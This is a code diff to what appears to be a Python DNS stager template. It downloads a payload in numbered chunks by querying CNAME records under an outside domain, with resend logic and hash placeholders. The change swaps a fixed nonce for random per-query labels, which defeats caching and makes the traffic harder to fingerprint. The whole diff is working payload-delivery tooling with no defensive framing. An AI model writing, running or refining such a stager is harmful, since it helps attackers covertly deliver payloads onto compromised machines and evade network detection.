@@ -15,12 +15,24 @@ import zlib
 
 BASE_DOMAIN = '{{BASE_DOMAIN}}'
 CNAME_SUFFIX = '{{CNAME_SUFFIX}}'
-STAGER_NONCE = '{{STAGER_NONCE}}'
 PAYLOAD_HASH = '{{PAYLOAD_HASH}}'
 SFB_ARGS = {{SFB_ARGS}}
 
-COUNT_NAME = '%s.count.%s' % (STAGER_NONCE, BASE_DOMAIN)
-PIECE_FMT = '%s.%%05d.%s' % (STAGER_NONCE, BASE_DOMAIN)
+CACHE_BUSTER_PREFIX = 'r-'
+CACHE_BUSTER_HEX_LEN = 8
+
+
+def _cache_buster_label():
+    value = random.getrandbits(32)
+    return '%s%08x' % (CACHE_BUSTER_PREFIX, value)
+
+
+def _count_name(label):
+    return '%s.count.%s' % (label, BASE_DOMAIN)
+
+
+def _piece_name(label, index):
+    return '%s.%05d.%s' % (label, index, BASE_DOMAIN)
 TIMEOUT = 2.0
 PIPELINE_WINDOW = 8
 PIPELINE_RESEND_AFTER = 0.5
@@ -196,7 +208,8 @@ def _query(name, resolver):
 
 def _fetch_count(resolver):
     while True:
-        cname = _query(COUNT_NAME, resolver)
+        name = _count_name(_cache_buster_label())
+        cname = _query(name, resolver)
         if cname:
             payload = _decode_cname(cname)
             if payload and len(payload) >= 7:
@@ -229,7 +242,7 @@ def _fetch_chunks(resolver, count):
             while len(pending) < window and next_index <= count:
                 index = next_index
                 next_index += 1
-                name = PIECE_FMT % index
+                name = _piece_name(_cache_buster_label(), index)
                 while True:
                     dns_id, packet = _build_query(name)
                     if dns_id not in pending_ids:
@@ -238,7 +251,7 @@ def _fetch_chunks(resolver, count):
                     sock.sendto(packet, (resolver, 53))
                 except (socket.error, OSError):
                     pass
-                pending[index] = {'id': dns_id, 'last_sent': now}
+                pending[index] = {'id': dns_id, 'last_sent': now, 'name': name}
                 pending_ids[dns_id] = index
             pending_indices = []
             for index in pending:
@@ -249,7 +262,7 @@ def _fetch_chunks(resolver, count):
                     continue
                 if now - info['last_sent'] < PIPELINE_RESEND_AFTER:
                     continue
-                _, packet = _build_query(PIECE_FMT % index, info['id'])
+                _, packet = _build_query(info['name'], info['id'])
                 try:
                     sock.sendto(packet, (resolver, 53))
                 except (socket.error, OSError):
@@ -274,7 +287,7 @@ def _fetch_chunks(resolver, count):
                 qname, cname = _parse_cname(data)
                 if not qname:
                     continue
-                expected = PIECE_FMT % index
+                expected = info['name']
                 if qname.lower() != expected.lower():
                     continue
                 if not cname:
